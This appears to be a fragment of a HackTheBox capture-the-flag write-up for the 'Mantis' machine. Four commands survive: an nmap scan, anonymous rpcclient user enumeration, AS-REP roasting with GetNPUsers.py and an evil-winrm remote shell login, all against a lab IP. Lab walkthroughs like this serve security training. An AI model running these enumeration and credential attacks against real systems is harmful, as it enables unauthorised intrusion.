---
layout: page
title: "Mantis - HackTheBox Writeup"
...
```bash
nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.10.52
```
...
```bash
rpcclient -U "" -N 10.10.10.52 -c "enumdomusers"
```
...
```bash
GetNPUsers.py -dc-ip 10.10.10.52 -no-pass -usersfile users.txt domains/
```
...
```bash
evil-winrm -i 10.10.10.52 -u username -p password
```
